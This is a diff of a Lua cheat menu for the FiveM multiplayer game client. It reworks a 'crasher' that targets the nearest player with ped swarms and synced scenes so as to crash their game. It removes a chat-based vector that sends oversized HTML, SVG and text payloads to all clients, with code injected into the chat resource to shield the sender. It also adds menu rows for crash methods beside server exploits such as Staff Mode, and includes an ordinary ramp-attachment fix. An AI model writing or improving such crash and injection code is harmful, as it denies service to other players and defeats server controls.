+    if not prepareSwarm(target, count) then
+        C.running = false
+        O.log("crash: swarm unavailable")
+        return
     end
 
     local deadline = now() + preset().duration
-    local lastEnsure = 0
+    local cycle = 0
 
     while C.running and now() < deadline do
         target = C.target()
-        if not target then break end
+        if not target or isDead(target.ped) then break end
+        C.targetPed = target.ped
 
-        if #C.pool > 0 then C.orbit(target, math.random(1, 3)) end
-        if METHODS[C.method].fx then C.fx(target) end
-        if METHODS[C.method].bag then C.pushBag() end
+        local participants = usableParticipants(target)
+        if #participants < 2 then
+            C.stats.fails = C.stats.fails + 1
+            Citizen.Wait(300)
+        else
+            local controlled = controlAll(participants)
+            local hasTarget = false
+            for i = 1, #controlled do
+                if controlled[i] == target.ped then hasTarget = true end
+            end
+            if not hasTarget then
+                if not takeControl(target.ped, 600) then break end
+                controlled[#controlled + 1] = target.ped
+            end
 
-        if now() - lastEnsure > 450 then
-            lastEnsure = now()
-            C.ensurePool(target)
-            if math.random() < 0.35 then verifyPool() end
+            cycle = cycle + 1
+            C.stats.cycles = cycle
+            runScene(controlled, target, cycle)
         end
 
-        Citizen.Wait(math.random(preset().gapMin, preset().gapMax))
+        Citizen.Wait(preset().gap)
     end
 
     C.cleanup()
     C.running = false
-    O.log("crash: done %d created, %d moved, %d fx, %d bags, %d fails",
-        C.stats.created, C.stats.moved, C.stats.fx, C.stats.bags, C.stats.fails)
+    O.log("crash: done %d scenes, %d peds, %d anims, %d fails",
+        C.stats.scenes, C.stats.created, C.stats.anims, C.stats.fails)
 end
 
 function C.launch()
@@ -19842,10 +19630,7 @@ function C.launch()
         O.log("crash: already running")
         return false
     end
-    if C.probing then
-        O.log("crash: probe in progress")
-        return false
-    end
+
     C.refresh()
     if #C.targets == 0 then
         O.log("crash: no player within 280 m")
@@ -19863,174 +19648,30 @@ function C.launch()
     return true
 end
 
--- One witness, created locally then moved once. If the server cancels the
--- entity, the channel is closed and the cap is cut before a real run.
-function C.probe()
-    if C.probing then return end
-    if C.running then
-        O.log("crash probe: stop the run first")
-        return
-    end
-    C.probing = true
-
-    Citizen.CreateThread(function()
-        local ok, err = pcall(function()
-            local target = C.target()
-            if not target then
-                O.log("crash probe: no target")
-                return
-            end
-
-            C.resetCaps()
-            local handle = spawnObject()
-            if handle then
-                Citizen.Wait(800)
-                moveToTarget(handle, target, 5.0, 0.5, 2.0)
-                Citizen.Wait(600)
-                C.channels.spawn = DoesEntityExist(handle)
-                if not C.channels.spawn then shrink("create") end
-                C.channels.bag = pcall(function()
-                    Entity(handle).state:set("probe", "1", true)
-                end)
-                deleteHandle(handle, "object")
-            else
-                C.channels.spawn = false
-                C.channels.bag = false
-            end
-
-            C.channels.fx = loadFx()
-            O.log("crash probe: entities %s, fx %s, bag %s",
-                tostring(C.channels.spawn), tostring(C.channels.fx), tostring(C.channels.bag))
-        end)
-
-        C.probing = false
-        if not ok then O.log("crash probe: %s", tostring(err)) end
-    end)
+function C.stop()
+    C.running = false
+    C.cleanup()
 end
 
--- ---------------------------------------------------------------------------
--- GLOBAL CHAT VECTOR (experimental)
---
--- This is the only vector that leaves the streaming radius. It is opt-in and
--- self-shielded: before sending, a tiny filter is installed in the chat
--- resource that drops only messages carrying this run's nonce, so the
--- operator's own client does not render the payload. The filter has no loop
--- and no native call; it wraps one function and returns.
--- ---------------------------------------------------------------------------
-
-C.chatPresets = {
-    {
-        label = "CSS blur",
-        value = '<div style="position:fixed;left:-50vw;top:-50vh;width:200vw;height:200vh;'
-            .. 'background:#000;filter:blur(4000px);opacity:.02"></div>',
-    },
-    {
-        label = "SVG filter",
-        value = '<svg width="16000" height="16000"><filter id="f">'
-            .. '<feGaussianBlur stdDeviation="1500"/></filter>'
-            .. '<rect width="16000" height="16000" filter="url(#f)"/></svg>',
-    },
-    {
-        label = "Table",
-        value = "<table>" .. string.rep("<tr><td>", 4000) .. "</td></tr></table>",
-    },
-    {
-        label = "Text",
-        value = string.rep("W", 60000),
-    },
-}
-
-local function installChatShield(nonce)
-    if not has("InjectResource") then return false end
-
-    -- Refuse to send if the chat resource is known not to be injectable: the
-    -- operator would render the payload on their own client.
-    if has("GetInjectableResources") then
-        local okList, list = pcall(Susano.GetInjectableResources)
-        if okList and type(list) == "table" then
-            local found = false
-            for i = 1, #list do
-                local entry = list[i]
-                local name = entry
-                if type(entry) == "table" then name = entry.name or entry.resource end
-                if type(name) == "string" and name:lower() == "chat" then found = true end
-            end
-            if not found then return false end
-        end
+function C.cleanup()
+    if C.scene and C.scene ~= 0 then
+        pcall(NetworkStopSynchronisedScene, C.scene)
+        C.scene = 0
     end
 
-    local flag = "__vgd_" .. nonce
-    local code = ([==[
-if not _G[%q] then
-  _G[%q] = true
-  local send = SendNUIMessage
-  if send then
-    local function dirty(v, d)
-      if d > 8 then return false end
-      if type(v) == "string" then return v:find(%q, 1, true) ~= nil end
-      if type(v) == "table" then
-        for _, sub in pairs(v) do
-          if dirty(sub, d + 1) then return true end
-        end
-      end
-      return false
-    end
-    SendNUIMessage = function(data)
-      if dirty(data, 0) then return end
-      return send(data)
-    end
-  end
-end
-]==]):format(flag, flag, nonce)
-
-    local injectionType = nil
-    local s = rawget(_G, "Susano")
-    if type(s) == "table" and type(s.InjectionType) == "table" then
-        injectionType = s.InjectionType.NEW_THREAD
+    if C.targetPed ~= 0 then
+        clearPed(C.targetPed)
+        C.targetPed = 0
     end
 
-    local ok
-    if injectionType ~= nil then
-        ok = pcall(s.InjectResource, "chat", code, injectionType)
-    else
-        ok = pcall(s.InjectResource, "chat", code)
+    for i = #C.swarm, 1, -1 do
+        local entry = C.swarm[i]
+        clearPed(entry.ped)
+        if entry.spawned then deleteSpawned(entry) end
     end
-    return ok
-end
+    C.swarm = {}
 
-function C.sendGlobal()
-    if C.chatBusy then return false end
-    if C.lastChat and now() - C.lastChat < 8000 then
-        O.log("crash chat: cooldown")
-        return false
-    end
-    C.chatBusy = true
-    C.lastChat = now()
-
-    Citizen.CreateThread(function()
-        local ok, err = pcall(function()
-            local nonce = ("vgd%06x"):format(math.random(0, 0xFFFFFF))
-            if C.chatShield and not installChatShield(nonce) then
-                O.log("crash chat: shield refused, send aborted")
-                return
-            end
-            if C.chatShield then Citizen.Wait(400) end
-
-            local presetValue = C.chatPresets[C.chatPreset] or C.chatPresets[1]
-            local payload = "<!--" .. nonce .. "-->" .. presetValue.value
-            local name = GetPlayerName(PlayerId()) or "unknown"
-
-            pcall(TriggerServerEvent, "_chat:messageEntered", name, { 255, 255, 255 }, payload)
-            pcall(TriggerServerEvent, "chat:messageEntered", name, { 255, 255, 255 }, payload)
-
-            O.log("crash chat: %s sent (%d bytes)", presetValue.label, #payload)
-        end)
-
-        C.chatBusy = false
-        if not ok then O.log("crash chat: %s", tostring(err)) end
-    end)
-
-    return true
+    for i = 1, #ANIM_DICTS do pcall(RemoveAnimDict, ANIM_DICTS[i]) end
 end
 
 return C
@@ -28166,6 +27807,8 @@ end
 local CRASH_ROWS = {
     "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
     "Stop + clean", "Probe channels", "Objects (orbit)",
+    "Anim churn", "Synced scenes", "Ped variation", "Objects (flood)",
+    "PTFX storm", "Clip swarm",
 }
 
 -- The current labels are part of the sweep as well. Without them, every
@@ -28215,15 +27858,16 @@ local function installCrasher()
         end
     end
 
-    -- Fixed power per method; it is not exposed as a menu setting. Ped
-    -- variation and flood use Heavy; PTFX uses Standard.
+    -- One method, Heavy by default. The dump shows the store already at
+    -- 19807/21000; the scene hold is the part that lets every client stream
+    -- the dictionaries before the release.
     --
     -- Prepend the crash block instead of appending it. The base Exploits tab
     -- also carries the server rows (Staff Mode, Disable Weapon Damage, Menu
-    -- Staff, Revive); with ItemsPerPage = 8, appending would push PTFX storm
-    -- onto a second page. The crash methods come first and the server rows stay
-    -- available underneath.
-    local power = { 3, 3, 2 }
+    -- Staff, Revive); with ItemsPerPage = 8, the single crash row and its
+    -- separator stay on the first page and the server rows remain available
+    -- underneath.
+    local power = { 3 }
     local crashItems = {
         {
             name = "",
@@ -28463,9 +28107,26 @@ local function installRampFix()
             local ok, value = pcall(IsEntityAttached, obj)
             if ok and value ~= nil then return value == true end
         end
-        -- No getter: accept the successful native call. The collision proof
-        -- below still refuses a prop that cannot be made solid.
+        -- No getter: accept the successful native call. The retry pass below
+        -- still re-applies the attachment and collision after a short delay.
         return true
+    end
+
+    -- Best-effort attachment. A freshly created object often ignores the
+    -- attachment for a frame or two, and the getter can still report false
+    -- after a successful native call. Never delete the prop on that read: a
+    -- visible prop at the spawn point is always better than an empty screen.
+    local function attachToCarrier(obj, vehicle, offsetY, offsetZ)
+        if type(AttachEntityToEntity) ~= "function" then return false end
+        local ok = pcall(AttachEntityToEntity, obj, vehicle, 0,
+            0.0, offsetY, offsetZ, 0.0, 0.0, 0.0,
+            false, false, true, false, 1, true)
+        if ok then
+            -- The carrier must not collide with its own ramp. Everything else
+            -- still does; this is the pair the attach constraint protects.
+            pcall(SetEntityNoCollisionEntity, obj, vehicle, false)
+        end
+        return ok
     end
 
     local function spawnRamp(vehicle, vehicleFront, vehicleBottom)
@@ -28508,32 +28169,28 @@ local function installRampFix()
 
                 if obj and obj ~= 0 and DoesEntityExist(obj) then
                     pcall(SetEntityAsMissionEntity, obj, true, true)
-                    pcall(SetEntityRotation, obj, 0.0, 0.0, 0.0, 2, true)
+                    -- Align the visible fallback with the car. The attach
+                    -- overrides this with fixedRot when it succeeds.
+                    local heading = 0.0
+                    if type(GetEntityHeading) == "function" then
+                        local ok, value = pcall(GetEntityHeading, vehicle)
+                        if ok and type(value) == "number" then heading = value end
+                    end
+                    pcall(SetEntityRotation, obj, 0.0, 0.0, heading, 2, true)
 
-                    local attached = false
-                    if type(AttachEntityToEntity) == "function" then
-                        local ok = pcall(AttachEntityToEntity, obj, vehicle, 0,
-                            0.0, offsetY, offsetZ, 0.0, 0.0, 0.0,
-                            false, false, true, false, 1, true)
-                        attached = ok and isAttached(obj, vehicle)
+                    local attachOk = attachToCarrier(obj, vehicle, offsetY, offsetZ)
+                    local proof = enableCollision(obj)
+                    if not attachOk then
+                        O.log("ramp: %s attach call failed; keeping the visible prop and retrying", model)
+                    elseif proof == false then
+                        O.log("ramp: %s collision proof false; keeping the visible prop and retrying", model)
                     end
 
-                    if not attached then
-                        O.log("ramp: %s could not be attached, trying next", model)
-                        deleteObject(obj, id)
-                    else
-                        local proof = enableCollision(obj)
-                        if proof == false then
-                            O.log("ramp: %s kept collision disabled, trying next", model)
-                            deleteObject(obj, id)
-                        else
-                            -- The carrier must not collide with its own ramp.
-                            -- Everything else still does; this is the pair the
-                            -- attach constraint already protects.
-                            pcall(SetEntityNoCollisionEntity, obj, vehicle, false)
-                            return obj, id, model, offsetY, offsetZ, proof, half
-                        end
-                    end
+                    -- Keep the first object that exists. A transient attach or
+                    -- collision read must never leave the operator with
+                    -- nothing. The one-shot retry below re-attaches and
+                    -- re-applies collision after the object has streamed in.
+                    return obj, id, model, offsetY, offsetZ, proof, half
                 end
             end
         end
@@ -28623,7 +28280,36 @@ local function installRampFix()
         state.model = modelName
         state.attach = { y = offsetY, z = offsetZ, half = half }
 
-        O.log("ramp: attached %s front=%.2f lip=%.2f high=%.2f collision=%s ttl=%ds",
+        -- One-shot recovery: a fresh local object can ignore the attach for a
+        -- frame or two. Re-issue the attach and collision after 200 ms and
+        -- again after 300 ms. The prop is already visible at the spawn point,
+        -- so even a failed recovery leaves the operator with a ramp instead of
+        -- an empty screen.
+        local function retryAttach()
+            if not state.active or state.obj ~= obj or state.veh ~= vehicle then
+                return false
+            end
+            if not DoesEntityExist(obj) or not DoesEntityExist(vehicle) then
+                return false
+            end
+            if not isAttached(obj, vehicle) then
+                attachToCarrier(obj, vehicle, offsetY, offsetZ)
+            end
+            enableCollision(obj)
+            return true
+        end
+        Menu.__vgd_rampRetry = retryAttach
+
+        if type(Citizen) == "table" and type(Citizen.CreateThread) == "function" then
+            pcall(Citizen.CreateThread, function()
+                Citizen.Wait(200)
+                retryAttach()
+                Citizen.Wait(300)
+                retryAttach()
+            end)
+        end
+
+        O.log("ramp: created %s front=%.2f lip=%.2f high=%.2f collision=%s ttl=%ds",
             tostring(modelName), vehicleFront, vehicleFront - RAMP_SINK,
             vehicleFront - RAMP_SINK + half * 2.0,
             proof == nil and "unknown" or tostring(proof),
@@ -28645,20 +28331,18 @@ local function installRampFix()
             removeRamp()
             return false
         end
-        -- Prefer the pair check: a prop still attached to something else is
-        -- not a valid ramp for this carrier. Fall back to the generic getter
-        -- on builds that only expose IsEntityAttached.
+        -- A false attachment read is not a reason to delete a visible prop:
+        -- the attach can be pending, and the one-shot retry owns the repair.
+        -- Only a deleted prop or carrier removes the ramp.
         if type(IsEntityAttachedToEntity) == "function" then
             local ok, value = pcall(IsEntityAttachedToEntity, obj, state.veh)
             if ok and value == false then
-                removeRamp()
-                return false
+                O.log("ramp: prop is no longer attached; leaving it visible")
             end
         elseif type(IsEntityAttached) == "function" then
             local ok, value = pcall(IsEntityAttached, obj)
             if ok and value == false then
-                removeRamp()
-                return false
+                O.log("ramp: prop is no longer attached; leaving it visible")
             end
         end
         return true
